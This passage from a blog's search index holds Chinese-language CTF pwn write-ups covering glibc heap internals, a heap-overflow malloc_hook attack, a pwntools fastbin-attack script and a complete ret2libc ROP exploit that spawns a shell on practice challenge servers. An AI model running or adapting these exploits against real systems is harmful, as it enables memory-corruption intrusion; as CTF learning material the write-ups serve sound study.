      
    </categories>
    
    
    <tags>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sctf2019_easy_heap</title>
    <link href="/2021/11/18/sctf2019_easy_heap/"/>
    <url>/2021/11/18/sctf2019_easy_heap/</url>
    
    <content type="html"><![CDATA[<p>就是一道简单的heap，但要记录下更深的heap源码的理解</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/tcache/">tcache - CTF Wiki</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>一个free掉会进入tcache bin中的chunk 会被加入到 同样大小的tcache chunk 的链表的头部，同时将entries[tc_idx]&#x3D;e而在malloc一个tcache chunk时，就会拿到链表的头部的chunk。 这样就会使得tcache的进出顺序为：先进后出</p><p>chunk合并：</p><p>这道题涉及到了前向合并：<br>    &#x2F;*<br>      If max_fast is 0, we know that av hasn’t<br>      yet been initialized, in which case do so below<br>    *&#x2F;<br>    &#x2F;&#x2F; 说明 fastbin 已经初始化<br>    if (get_max_fast() !&#x3D; 0) {<br>        &#x2F;&#x2F; 清空 fastbin 标记<br>        &#x2F;&#x2F; 因为要合并 fastbin 中的 chunk 了。<br>        clear_fastchunks(av);<br>        &#x2F;&#x2F;<br>        unsorted_bin &#x3D; unsorted_chunks(av);</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">  then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">  placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">  until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">  reused anyway.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// 按照 fd 顺序遍历 fastbin 的每一个 bin，将 bin 中的每一个 chunk 合并掉。</span><br>maxfb = &amp;fastbin(av, NFASTBINS - <span class="hljs-number">1</span>);<br>fb    = &amp;fastbin(av, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">do</span> &#123;<br>    p = atomic_exchange_acq(fb, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            check_inuse_chunk(av, p);<br>            nextp = p-&gt;fd;<br> <br>            <span class="hljs-comment">/* Slightly streamlined version of consolidation code in</span><br><span class="hljs-comment">             * free() */</span><br>            size      = chunksize(p);<br>            nextchunk = chunk_at_offset(p, size);<br>            nextsize  = chunksize(nextchunk);<br> <br>            <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>                prevsize = prev_size(p);<br>                size += prevsize;<br>                p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>                unlink(av, p, bck, fwd);<br>            &#125;<br> <br>            <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>                <span class="hljs-comment">// 判断 nextchunk 是否是空闲的。</span><br>                nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br> <br>                <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>                    size += nextsize;<br>                    unlink(av, nextchunk, bck, fwd);<br>                &#125; <span class="hljs-keyword">else</span><br>                 <span class="hljs-comment">// 设置 nextchunk 的 prev inuse 为0，以表明可以合并当前 fast chunk。</span><br>                    clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br> <br>                first_unsorted     = unsorted_bin-&gt;fd;<br>                unsorted_bin-&gt;fd   = p;<br>                first_unsorted-&gt;bk = p;<br> <br>                <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>                    p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                    p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br> <br>                set_head(p, size | PREV_INUSE);<br>                p-&gt;bk = unsorted_bin;<br>                p-&gt;fd = first_unsorted;<br>                set_foot(p, size);<br>            &#125;<br> <br>            <span class="hljs-keyword">else</span> &#123;<br>                size += nextsize;<br>                set_head(p, size | PREV_INUSE);<br>                av-&gt;top = p;<br>            &#125;<br> <br>        &#125; <span class="hljs-keyword">while</span> ((p = nextp) != <span class="hljs-number">0</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br></code></pre></td></tr></table></figure><p>也就是我们free的目标的chunk在执行free时，会检查前后的chunk情况，看看能不能合并成一个大的chunk，如果前一块为free状态，那么就可以进行前向合并，这道题我们修改chunk3的pre_inuse位为0，这样在free(3)时我们就可以进行前向合并，这样我们就拿到了一块特别大的chunk，然后再malloc回来原来的chunk，就能得到double free.</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>roarctf_2019_easy_pwn</title>
    <link href="/2021/07/29/roarctf_2019_easy_pwn/"/>
    <url>/2021/07/29/roarctf_2019_easy_pwn/</url>
    
    <content type="html"><![CDATA[<p>白天睡觉，晚上来写道题。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这道题涉及了unsortedbins，malloc_hook，堆溢出。</p><p>heap的菜单选项常规题，做到目前为止，主要是两个思路：</p><p>先check，根据RELRO。如果为full，那么就需要malloc_hook。如果为partial，就直接更改got表就可以了。</p><p>在create函数中可以明显看出来这是个结构体</p><p><img src="/img/roarctf_2019_easy_pwn-1.png" alt="roarctf_2019_easy_pwn-1"></p><p>一个结构体有24个字节，前8个为标志位，中间8个size位，后8个是alloc出来的chunk的指针。</p><p>（alloc和malloc不同的是 alloc的free后会清空用户数据区）</p><p>其中a1 为基地址，我一开始还打算去找这个a1，</p><p>但是看到这个a1的初始化。</p><p><img src="/img/roarctf_2019_easy_pwn-2.png" alt="roarctf_2019_easy_pwn-2"></p><p>这里面buf是随机数字，所以a1搜寻未果。</p><p><img src="/img/roarctf_2019_easy_pwn-3.png" alt="roarctf_2019_easy_pwn-3"></p><p>fill函数中，没有根据chunk的大小来限制写入大小。所以存在着溢出漏洞。</p><p>主要思路就是，根据unsorted bin 中的fd。利用main_arean泄露libc（这个还没有查阅资料）</p><p>然后利用之前布置好的盖在小块的大块来dump出来。</p><p>接下来是漏洞利用。钩子函数详细，可以查阅这个资料<br><a href="https://blog.csdn.net/qq_41453285/article/details/99315504">https://blog.csdn.net/qq_41453285/article/details/99315504</a></p><p>里面介绍的很清晰，具体思路就是，在钩子函数之前有一个为末位的一块内存区域，因为fastbin中没有对齐限制。所以我们可以修改fastbin中最后一个的fd指针，指向这里，让fastbin将它加入，然后在malloc一下，之后就可以通过溢出（具体溢出长度，上面那个资料中有详细的介绍）来修改malloc_hook 处的内容：malloc函数执行的时候会先检测__malloc_hook是否为空，如果不为空就执行__mallochook。所以这时候把malloc_hook 修改为一个one_gadget的地址（好像是存在这几个固定的地址。只需要libc的基地址加上这个偏移）</p><p>那么最后再malloc一个chunk就可以触发 one_gadget。</p><p>果然还是多做题才能多涨姿势。</p><p>但是套路应该就是这几个套路了。</p><p>难题可能在泄露libc上下难度，目前我觉得应该就是这几个套路了，后续继续学习新的漏洞利用手段。</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ZJCTF2019-EasyHeap</title>
    <link href="/2021/07/27/ZJCTF2019-EasyHeap/"/>
    <url>/2021/07/27/ZJCTF2019-EasyHeap/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/ZJCTF2019-EasyHeap-1.png" alt="[ZJCTF 2019]EasyHeap-1"></p><p> 做题先check找攻击手段，Partial RELRP -&gt; 修改got表</p><p><img src="/img/ZJCTF2019-EasyHeap-2.png" alt="[ZJCTF 2019]EasyHeap-2"></p><p>菜单题，直接找准delete看看有没有UAF。</p><p><img src="/img/ZJCTF2019-EasyHeap-3.png" alt="[ZJCTF 2019]EasyHeap-3"></p><p>UAF未果。</p><p><img src="/img/ZJCTF2019-EasyHeap-4.png" alt="[ZJCTF 2019]EasyHeap-4"></p><p>但是在Edit_heap中存在漏洞。</p><p>这里看起来是以为可以修改heap的size，其实这个size是用来对你的输入进行限制的。（<a href="https://so.csdn.net/so/search?q=%E6%A0%88%E6%BA%A2%E5%87%BA&spm=1001.2101.3001.7020">栈溢出</a>就在这里把size写的很大，方便我们写入）</p><p><img src="/img/ZJCTF2019-EasyHeap-5.png" alt="[ZJCTF 2019]EasyHeap-5"></p><p>而且这个程序写的会让你修改chunk的信息域</p><p>所以 wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;26279&quot;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1\n&#x27;</span>)   <span class="hljs-comment">#create 0 heap</span><br>sh.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-string">&#x27;96\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1\n&#x27;</span>)   <span class="hljs-comment">#create 1 heap</span><br>sh.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-string">&#x27;96\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3\n&#x27;</span>)   <span class="hljs-comment"># free 1</span><br>sh.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-string">&#x27;1\n&#x27;</span>)<br>x = p64(<span class="hljs-number">0x0</span>) * <span class="hljs-number">13</span> + p64(<span class="hljs-number">0x71</span>)  + p64(<span class="hljs-number">0x6020ad</span>) + p64(<span class="hljs-number">0x0</span>)  <span class="hljs-comment">#create fake chunk</span><br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-string">&#x27;0\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-string">&#x27;1000\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,x)<br>sh.sendafter(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1\n&#x27;</span>)      <span class="hljs-comment">#create 1 heap</span><br>sh.sendafter(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-string">&#x27;96\n&#x27;</span>)<br>sh.sendafter(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/BengDouLove/article/details/105391153?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162731259516780271593086%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162731259516780271593086&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-105391153.first_rank_v2_pc_rank_v29&utm_term=BUUCTF+%5BZJCTF+2019%5DEasyHeap&spm=1018.2226.3001.4187">参考链接</a></p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_c_1</title>
    <link href="/2021/05/25/ciscn_2019_c_1/"/>
    <url>/2021/05/25/ciscn_2019_c_1/</url>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/img/ciscn_2019_c_1-1.png"></p><p>F5反汇编main函数后，会让我们选择函数。我们注意到</p><p><img src="/img/ciscn_2019_c_1-2.png"></p><p>encrypt函数中存在着gets(s) 栈溢出漏洞。</p><p>但是并没有存在system函数，所以我们不能直接利用。</p><p>所以我们要用ret2libc技术，先考虑泄露libc基地址。</p><p>在mian和encrypt函数中都出现了puts函数</p><p>我们知道根据延迟绑定技术：</p><p><em>plt表中的函数如果没有被调用过，那么got表中该函数的对应项则指向plt表的第二行指令。当完成了第一次调用后，got表中会存放函数的真实地址，plt表这时候只起到调用的作用。</em></p><h1 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h1><p>所以，puts函数既被函数调用了，又可以输出一些东西，可以成为我们ret2libc技术的好帮手。</p><p>所以我们第一个payload1应该是</p><p><code>payload1=b&quot;a&quot;*88+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</code></p><p>第一次写，我可能写的比较啰嗦</p><p>记一下笔记：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. ‘a&#x27;*<span class="hljs-number">88</span>前加b的原因是 py3中 char类型想要用+拼接要加上b强制转换。<br><span class="hljs-attribute">2</span>. pop_rdi_addr  是因为在x64中，函数调用优先使用寄存器。超过<span class="hljs-number">6</span>个参数后才使用栈传参。<br><span class="hljs-attribute">3</span>. puts_got是把puts函数的真实地址传递给rdi<br><span class="hljs-attribute">4</span>. puts_plt用于作为返回地址调用函数<br><span class="hljs-attribute">5</span>. 最后我们再次进入整个程序。<br></code></pre></td></tr></table></figure><p>接下来我们提交过后需要接收puts函数的真实位置，再根据libc不同版本下puts函数的偏移，来计算出libc基地址。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">puts=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<span class="hljs-selector-attr">[:-1]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\0&#x27;</span>))`<br><br><span class="hljs-selector-attr">[:-1]</span>代表的是取该行字符串除去最后一个字符外的字符串。（可能是因为最后一个字符是个换行符）<br><br><span class="hljs-function"><span class="hljs-title">ljust</span><span class="hljs-params">(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\0&#x27;</span>)</span></span>的意思是 接收<span class="hljs-number">8</span>个字符，再加上\<span class="hljs-number">0</span> 成为一个字符串<br></code></pre></td></tr></table></figure><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>接下来暴露了libc地址，就是简单的rop了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br>context.<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.<span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-attribute">ru</span>=lambda x:io.recvuntil(x)<br><span class="hljs-attribute">rl</span>=lambda :io.recvline()<br><span class="hljs-attribute">sla</span>=lambda x,y:io.sendlineafter(x,y)<br><span class="hljs-attribute">io</span>=remote(&#x27;node3.buuoj.cn&#x27;,******)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./ciscn_2019_c_1&#x27;)<br><span class="hljs-attribute">ret</span>=0x4006b9<br><span class="hljs-attribute">pop_rdi</span>=0x400c83<br><span class="hljs-attribute">main</span>=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-attribute">puts_plt</span>=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attribute">puts_got</span>=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sla(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-attribute">payload</span>=b&#x27;\0&#x27;+b&#x27;a&#x27;*(0x50-1+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>sla(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>rl()<br>rl()<br><span class="hljs-attribute">puts</span>=u64(ru(&#x27;\n&#x27;)[:-1].ljust(8,b<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;puts&#x27;,puts)<br><span class="hljs-attribute">libc_addr</span>=puts-libc.dump(&#x27;puts&#x27;)<br><span class="hljs-attribute">binsh</span>=libc_addr+libc.dump(&#x27;str_bin_sh&#x27;)<br><span class="hljs-attribute">system</span>=libc_addr+libc.dump(&#x27;system&#x27;)<br>sla(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-attribute">payload</span>=b&#x27;\0&#x27;+b&#x27;a&#x27;*(0x50-1+8)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>sla(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>stack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
